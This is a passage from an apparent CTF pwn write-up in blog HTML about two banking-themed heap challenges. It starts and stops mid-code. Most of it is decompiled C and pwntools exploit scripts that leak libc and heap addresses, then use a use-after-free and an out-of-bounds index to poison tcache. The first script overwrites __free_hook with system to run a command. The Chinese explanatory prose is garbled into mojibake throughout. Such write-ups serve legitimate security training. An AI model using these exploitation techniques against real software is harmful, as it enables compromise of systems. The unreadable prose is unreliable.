frozen.&quot;</span>);</span><br><span class="line">  *(_DWORD *)(user_list[user_id] + <span class="number">0x2C</span>LL) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å¤„åˆ™æ˜¯è¿™é‡Œåœ¨freeä¹‹åæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆå¼•èµ·çš„UAFã€‚</p><p>æ‰€ä»¥åˆ©ç”¨æ€è·¯å°±æ˜¯å…ˆæ³„æ¼libcåœ°å€ï¼Œå†æ³„æ¼heapåœ°å€ï¼Œæœ€ååˆ©ç”¨UAFç¯¡æ”¹<code>tcache</code>ä¸­chunkçš„fdåˆ°<code>__free_hook</code>å³å¯ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">3339</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random</span>(<span class="params">random</span>):</span></span><br><span class="line">    <span class="keyword">if</span> random &lt;= <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x30</span>+random</span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x61</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">11</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x62</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">12</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x63</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">13</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x64</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">14</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x65</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">seed = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(seed))</span><br><span class="line">objdll = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">objdll.srand(seed)</span><br><span class="line">uuid = <span class="string">&#x27;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&#x27;</span></span><br><span class="line">uuid = <span class="built_in">list</span>(uuid)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1d</span> + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(uuid[i]) != <span class="number">52</span> <span class="keyword">and</span> <span class="built_in">ord</span>(uuid[i]) != <span class="number">45</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(uuid[i]) == <span class="number">0x78</span>:</span><br><span class="line">            random_num = objdll.rand() % <span class="number">15</span></span><br><span class="line">            uuid[i] = <span class="built_in">chr</span>(get_random(random_num))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            random_num = objdll.rand() % <span class="number">15</span></span><br><span class="line">            uuid[i] = <span class="built_in">chr</span>(get_random(random_num &amp; <span class="number">3</span> | <span class="number">8</span>))</span><br><span class="line">uuid = <span class="string">&#x27;&#x27;</span>.join(uuid)</span><br><span class="line"><span class="built_in">print</span>(uuid)</span><br><span class="line">r.send(uuid)</span><br><span class="line">r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>():</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;query&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_account</span>(<span class="params">account, password, money</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;new_account&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += password.ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += account.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += <span class="built_in">bytes</span>(<span class="built_in">str</span>(money), encoding=<span class="string">&#x27;utf8&#x27;</span>).ljust(<span class="number">0x4</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cancellation</span>(<span class="params">password</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;cancellation&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += password.ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">account, password</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;login&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += password.ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += account.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_pwd</span>(<span class="params">old_password, new_password</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;update_pwd&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += new_password.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input your pasword.&#x27;</span>)</span><br><span class="line">    r.recv(<span class="number">0x84</span> - <span class="built_in">len</span>(<span class="string">&#x27;please input your pasword.&#x27;</span>))</span><br><span class="line">    payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">    payload += old_password.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;dzhsb&#x27;</span>, <span class="string">b&#x27;wow&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;dzz&#x27;</span>, <span class="string">b&#x27;zzz&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;a&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;stat_query&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x4</span>+<span class="number">0x18</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x21c87</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">r.recv(<span class="number">0x84</span> - <span class="number">0x24</span>)</span><br><span class="line"></span><br><span class="line">cancellation(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">login(<span class="string">b&#x27;dzz&#x27;</span>, <span class="string">b&#x27;zzz&#x27;</span>)</span><br><span class="line">cancellation(<span class="string">b&#x27;zzz&#x27;</span>)</span><br><span class="line">login(<span class="string">b&#x27;dzhsb&#x27;</span>, <span class="string">b&#x27;wow&#x27;</span>)</span><br><span class="line">query()</span><br><span class="line">r.recv(<span class="number">0x40</span> + <span class="number">4</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line">tcache_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tcache_addr))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + <span class="number">0x3ed8e8</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login(flat(tcache_addr), flat(heap_addr))</span><br><span class="line">update_pwd(flat(heap_addr), flat(free_hook))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;&gt;&amp;4&#x27;</span>, <span class="string">b&#x27;cat flag&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line">new_account(<span class="string">b&#x27;196082&#x27;</span>, flat(system_addr), <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line">login(<span class="string">b&#x27;&gt;&amp;4&#x27;</span>, <span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">cancellation(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™æ˜¯csæ¶æ„çš„ç¼˜æ•…ï¼Œæ²¡æœ‰ç›´æ¥ä¸ç¨‹åºè¿›è¡Œäº¤äº’ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨<code>system(&quot;/bin/sh&quot;);</code>ã€‚è€ƒè™‘ä½¿ç”¨åå¼¹shellä½†æ˜¯éœ€è¦é•¿åº¦è¿‡é•¿äº†ï¼Œæœ€ååªèƒ½ç”¨è¿™ç§é‡å®šå‘çš„æ–¹æ³•ä¼ é€’flagã€‚</p><h2 id="money"><a href="#money" class="headerlink" title="_money"></a>_money</h2><h3 id="åˆ©ç”¨åˆ†æ-2"><a href="#åˆ©ç”¨åˆ†æ-2" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>è¿™é“é¢˜ç›®çš„é€†å‘éƒ¨åˆ†å’Œä¸Šé¢é¢˜ç›®å¾ˆç±»ä¼¼ï¼Œç»†å¿ƒçš„è¯å¯ä»¥å¾ˆå¿«å‘ç°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">loan</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __m128i *v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 chunk; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( loan_idx &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;The loan has reached the upper limit of the system.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( *(_DWORD *)(user_list[uid] + <span class="number">0x34</span>LL) )</span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;You still have a loan that has not been paid off, so you cannot continue to borrow.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;Please enter the loan amount (no more than 1 million).&quot;</span>);</span><br><span class="line">    money = input_l();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)money &gt; <span class="number">0xF4240</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      my_puts(<span class="string">&quot;Don&#x27;t push your luck.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      my_puts(<span class="string">&quot;Please leave your comments.&quot;</span>);</span><br><span class="line">      my_read((<span class="keyword">char</span> *)(loan_money + <span class="number">72LL</span> * loan_idx + <span class="number">0x20</span>), <span class="number">0x20</span>);</span><br><span class="line">      v0 = (__m128i *)(loan_money + <span class="number">72LL</span> * loan_idx);</span><br><span class="line">      chunk = user_list[uid];</span><br><span class="line">      *v0 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(chunk + <span class="number">8</span>));</span><br><span class="line">      v0[<span class="number">1</span>] = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(chunk + <span class="number">0x18</span>));</span><br><span class="line">      LODWORD(chunk) = loan_idx;</span><br><span class="line">      v2 = money;</span><br><span class="line">      *(_QWORD *)(loan_money + <span class="number">72LL</span> * loan_idx + <span class="number">0x40</span>) = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)money;</span><br><span class="line">      v3 = (_DWORD *)user_list[uid];</span><br><span class="line">      v3[<span class="number">10</span>] += v2;</span><br><span class="line">      v3[<span class="number">12</span>] += v2;</span><br><span class="line">      v3[<span class="number">14</span>] = chunk;</span><br><span class="line">      v3[<span class="number">13</span>] = <span class="number">1</span>;</span><br><span class="line">      loan_idx = chunk + <span class="number">1</span>;</span><br><span class="line">      my_puts(<span class="string">&quot;The application has been submitted. Please check it.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸­çš„å› ä¸ºå¯¹<code>loan_idx</code>æ£€æŸ¥ä¸æ­£ç¡®å¯¼è‡´è¶Šç•Œè¯»å†™ã€‚åˆ©ç”¨æ€è·¯å°±æ˜¯é€šè¿‡è¶Šç•Œå†™ä¿®æ”¹sizeï¼Œä½¿åŸæœ¬chunkçš„sizeå˜ä¸º<code>0x460</code>ï¼Œé‡Šæ”¾åè¿›å…¥<code>unsorted bin</code>é€šè¿‡è¶Šç•Œè¯»è¯»å–libcåœ°å€ã€‚å†é€šè¿‡åŒæ ·çš„åŠæ³•ä½¿ç¬¬ä¸€ä¸ªchunkè¿›å…¥åˆ°tcacheä¸­å»ï¼Œæ³„æ¼å‡ºå †åœ°å€ã€‚æœ€åæœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œç†æ‰€å½“ç„¶ä¿®æ”¹tcacheä¸­chunkçš„fdæŒ‡é’ˆå³å¯ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Query&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_account</span>(<span class="params">account, password, money</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;new_account&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the account id&#x27;</span>)</span><br><span class="line">    r.sendline(account)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the password&#x27;</span>)</span><br><span class="line">    r.sendline(password)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the money&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(money), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_account</span>(<span class="params">password</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Cancellation&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please enter the password&#x27;</span>)</span><br><span class="line">    r.sendline(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_info</span>(<span class="params">new_password, old_password</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Update_info&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please entet  a new password&#x27;</span>)</span><br><span class="line">    r.sendline(new_password)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input your password.&#x27;</span>)</span><br><span class="line">    r.sendline(old_password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loan_money</span>(<span class="params">amount, comments</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Loan_money&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please enter the loan amount (no more than 1 million).&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(amount), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please leave your comments.&#x27;</span>)</span><br><span class="line">    r.sendline(comments)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repayment</span>(<span class="params">amount</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Repayment&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;How much do you want to repay?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(amount), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_all_loan</span>():</span></span><br><span 